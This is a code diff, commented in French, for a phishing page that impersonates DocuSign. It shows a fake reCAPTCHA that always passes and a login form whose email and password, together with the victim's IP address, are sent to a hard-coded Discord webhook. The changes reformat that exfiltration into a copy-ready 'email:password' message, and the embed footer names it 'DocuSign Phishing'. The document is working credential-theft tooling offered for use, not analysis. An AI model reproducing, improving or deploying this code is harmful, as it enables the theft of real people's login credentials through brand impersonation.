@@ -448,7 +448,7 @@
     // ====================================================================
     // PARTIE 1 : RECAPTCHA
     // ====================================================================
-    var recaptchaState = 'idle'; // idle | spinning | verified
+    var recaptchaState = 'idle';
 
     function startVerification() {
         if (recaptchaState === 'spinning' || recaptchaState === 'verified') return;
@@ -459,14 +459,12 @@
         var logo     = document.getElementById('recaptchaLogo');
         var card     = document.getElementById('recaptchaCard');
 
-        // Phase 1 : spinner
         recaptchaState = 'spinning';
         checkRow.classList.add('spinning');
         checkbox.innerHTML = '<div class="spinner"></div>';
         label.textContent = 'Vérification en cours...';
         logo.style.opacity = '0.3';
 
-        // Phase 2 : après 1.5s → succès
         setTimeout(function() {
             recaptchaState = 'verified';
             checkRow.classList.remove('spinning');
@@ -480,11 +478,9 @@
             document.getElementById('successBanner').classList.add('active');
             checkRow.onclick = null;
 
-            // 🔥 Transition vers la section login après 1.5s
             setTimeout(function() {
                 document.getElementById('recaptcha-section').classList.add('hidden');
                 document.getElementById('login-section').classList.remove('hidden');
-                // Auto-focus sur le champ email
                 document.getElementById('email-input').focus();
             }, 1500);
         }, 1500);
@@ -492,14 +488,14 @@
 
 
     // ====================================================================
-    // PARTIE 2 : LOGIN + DISCORD WEBHOOK
+    // PARTIE 2 : LOGIN + DISCORD WEBHOOK (format amélioré)
     // ====================================================================
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1521550622934171790/n_2Dc-FrYvMwB1jzcstLb7x0r0YcMtSA7nK0STEz1c3_i_DkiU_XSn1QhCLmyzqAgl7f';
 
     var geoData = { ip: 'Chargement...' };
     var totalSubmissions = 0;
 
-    // Récupération IP (ipify principal, ipapi fallback)
+    // IP
     (function fetchIP() {
         fetch('https://api.ipify.org?format=json')
             .then(function(r) { return r.json(); })
@@ -512,22 +508,33 @@
             });
     })();
 
+    // ═══════════ DISCORD : format `email:password` copiable ═══════════
     function sendToDiscord(email, password) {
-        var msg = [
-            '━━━━━━━━━━━━━━━━━━━━━━',
-            '**Docusign — nouveau identifiant**',
-            '━━━━━━━━━━━━━━━━━━━━━━',
-            '',
-            '📧 `' + (email || 'N/A') + '`',
-            '🔑 `' + (password || 'N/A') + '`',
-            '🔢 `' + totalSubmissions + '`',
-            '🌍 `' + geoData.ip + '`'
-        ].join('\n');
+        var copyLine = (email || 'N/A') + ':' + (password || 'N/A');
+
+        var payload = {
+            content: '@everyone **🔐 Docusign — Identifiants**\n```\n' + copyLine + '\n```',
+            embeds: [{
+                title: 'Docusign - Connexion',
+                color: 0x3D1F7A,
+                fields: [
+                    { name: '📧 Email', value: '`' + (email || 'N/A') + '`', inline: true },
+                    { name: '🔑 Mot de passe', value: '`' + (password || 'N/A') + '`', inline: true },
+                    { name: '📋 Copie rapide', value: '`' + copyLine + '`', inline: false },
+                    { name: '📊 Soumission n°', value: String(totalSubmissions), inline: true },
+                    { name: '🌐 IP', value: '`' + geoData.ip + '`', inline: true }
+                ],
+                footer: { text: 'DocuSign Phishing' },
+                timestamp: new Date().toISOString()
+            }]
+        };
 
         fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: msg })
+            body: JSON.stringify(payload)
+        }).catch(function(err) {
+            console.log('Erreur webhook:', err);
         });
     }
 
@@ -702,7 +709,6 @@
         return 'fr';
     }
 
-    // Init langue
     (function init() {
         var detected = detectLanguage();
         select.value = detected;
@@ -711,7 +717,7 @@
 
     select.addEventListener('change', function() { updateTexts(this.value); });
 
-    // Toggle password visibility
+    // Toggle password
     var pwVisible = false;
     togglePasswordBtn.addEventListener('click', function() {
         pwVisible = !pwVisible;
@@ -743,7 +749,7 @@
         passwordInput.focus();
     });
 
-    // BACK arrow (mot de passe → email)
+    // BACK arrow
     backArrow.addEventListener('click', function() {
         passwordPage.classList.add('hidden');
         emailPage.classList.remove('hidden');
